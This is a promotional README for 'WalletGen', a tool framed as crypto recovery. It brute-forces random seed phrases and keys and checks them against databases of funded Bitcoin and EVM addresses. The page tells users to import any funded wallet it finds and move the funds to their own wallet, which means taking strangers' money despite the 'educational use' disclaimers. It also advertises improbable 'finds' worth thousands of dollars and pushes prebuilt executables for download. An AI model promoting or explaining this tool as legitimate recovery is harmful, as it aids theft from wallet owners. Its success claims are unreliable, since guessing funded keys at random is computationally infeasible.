# Crypto Recovery Service: Your Key to Unlocking Lost Digital Assets with WalletGen

**Locked out of your crypto?** **WalletGen** provides a fast, efficient, and open-source solution for those seeking a **crypto recovery service**.  Recover lost or inactive **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets** with real-time balance checking and a high-performance C++ engine.

<!--
Meta description:
Need a crypto recovery service? WalletGen is your open-source solution. Recover lost Bitcoin, Ethereum, and EVM-compatible wallets with speed and efficiency. Brute-force, seed recovery. Get your crypto back!
-->

## Quick Navigation
- [How It Works: Understanding WalletGen's Recovery Process](#how-it-works)
- [Why Choose WalletGen as Your Recovery Service?](#why-walletgen)
- [Features: Key Benefits for Crypto Recovery](#features)
- [Download WalletGen: Start Your Recovery Journey](#how-to-start)
- [Speed Up Recovery: Database Downloads and Use](#download-and-use-database-for-more-speed)
- [What Happens When a Wallet Is Found?](#the-program-found-a-wallet--whats-next)
- [Bitcoin Recovery: Step-by-Step Guide](#recovery-your-bitcoin-wallet)
- [My Finds: Success Stories and Recovered Wallets](#my-finds)
- [Frequently Asked Questions (FAQ) for Crypto Recovery](#-frequently-asked-questions-faq)
- [Build WalletGen: Compile the Project Yourself](#building-the-project)
- [Support Development: Donate to the Project](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="crypto recovery service" title="WalletGen wallet generator" height="460" src="/upload/peek.webp" />
</p>

⚠️ **Important Notice**:  WalletGen is a research and educational tool only. It is *not* intended for unauthorized access or any malicious purposes.  Always use this tool responsibly, and only on wallets you own or have been authorized to access.

## How It Works

WalletGen operates using the well-established [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) protocols for Bitcoin. For EVM-based chains, such as Ethereum, it employs the [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing algorithm.

The core function of WalletGen involves generating various potential wallet addresses. These addresses are then checked for balances, either in real-time, through public blockchain explorers, or, more efficiently, by comparing them against pre-existing databases of known, funded wallet addresses. The C++ underpinnings of WalletGen provide superior speed compared to similar tools developed using Python, with overall performance dependent on your CPU and GPU.

## Why Choose WalletGen as Your Recovery Service?

Why choose a slow recovery process?  **WalletGen** is a C++-based solution, engineered for speed and efficiency in crypto recovery.  It provides up to **10x faster** performance when compared to Python-based brute-force tools.  If you're aiming to retrieve access to lost wallets, validate private key spaces, or regain control of your crypto holdings, WalletGen equips you with the speed and efficiency to accomplish your recovery.

## Features

-   **Crypto Wallet Generation**: Create wallets for Bitcoin, Ethereum, BNB, MATIC, and other cryptocurrencies.
-   **Brute-Force Balance Finding**: Use brute-force methods to search for wallets with balances across Bitcoin and EVM networks.
-   **Algorithm Support**: Supports Keccak256 for EVM wallets and BIP39, BIP44, and Bech32 for Bitcoin.
-   **Database Integration**: Download and use databases to significantly improve search speed, increasing efficiency.
-   **Optimized Speed**: WalletGen uses CPU and GPU power for peak performance.
-   **Bitcoin Seed Phrase Recovery**: Easily recover your Bitcoin wallet using your mnemonic seed phrase.

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on Windows Demo" title="WalletGen search lost bitcoin wallets on Windows" src="/upload/front.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on Linux Demo" title="WalletGen search lost bitcoin wallets on Linux" src="/upload/config.webp" />
</p>

# How to start

## Windows
-   Download [Release](../../releases)
-   Unpack anywhere
-   Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## Linux (x86-64bit)

Use wget
or download [Release for Linux](../../releases)




## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** uses brute-force to search for wallets with a balance.

### Bitcoin (BTC) Wallet Search:

*   Press `3` in the menu or run `start_search_btc.bat` to start searching Bitcoin wallets through the internet. This might take longer, since balances are checked through blockchain explorers in real-time.
*   Press `6` to search Bitcoin wallets by using the database. This method is faster because it compares generated wallets against a database of known addresses that contain balances.

### EVM Wallet Search (Ethereum, BNB, MATIC, etc.):

*   Press key `5` or run `start_search_evm.bat` to search EVM wallets through the internet. Balances are checked in real-time with blockchain explorers.
*   Press `6` to search EVM wallets by using the database. This method is faster since it compares generated wallets against the database of known, balance-containing addresses.

### Speed Considerations:

*   Your hardware affects search speed, especially your graphics card (GPU). Run multiple program instances (1 to 4) to increase your chances of finding a wallet.

Databases improve search efficiency by skipping the blockchain query for every generated wallet.

## The Program Found a Wallet — What’s Next?

When WalletGen finds a wallet with a balance, it will:
*   **Stop** immediately.
*   **Display** the wallet details in the console.
*   **Save** data to the `found_wallets.txt` file.

### How to Access the Funds?

1.  Import the **mnemonic seed phrase** into any compatible crypto wallet (Metamask, Trust Wallet, or Electrum).
2.  Transfer the funds to your own wallet.

>  Consider donating a portion of the recovered balance as a thank you!

## Recovery Your Bitcoin Wallet

WalletGen helps you recover your Bitcoin wallet using your seed phrase. You can enter the complete seed phrase or use wildcards to search for missing words.

### Process Description

#### Search for Missing Words:

If you have a seed phrase with missing words, use an *. WalletGen searches all possible combinations.

#### Entering a Complete Seed Phrase:

If you have a 12-word seed, enter it in full. WalletGen generates all address types (Legacy, SegWit, P2SH) and checks balances.

![recovery](/upload/template.webp)

### Important Recommendations

*   Seed phrases must have exactly 12 words.
*   Use only the * symbol to search for missing words.
*   Searching for missing words can take time.
*   Upon successful recovery, the program stops and saves data.

## My Finds

![mywallet](/upload/layout.webp)

I've personally recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second held 0.0528 BTC (around $4800).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/upload/trim.webp" />
</p>

### New Find 4/9/2025

After a week of searching, I found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my largest find!

![image](/upload/portion.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/upload/focus.webp)

## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or a compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
Download WalletGen on the [release download page](../../releases).

### ❓ Where can I download a database of known addresses?
The current database can be found on the [release page](../../releases).

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes, WalletGen can potentially help you recover lost Bitcoin wallets through brute-force seed generation and a known-address database.

### ❓ Is WalletGen a seed phrase generator?
Yes, WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

When a wallet with a balance is found, consider sending a portion as a thank you to support the project.

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)





Update:  06/16/2025 05-42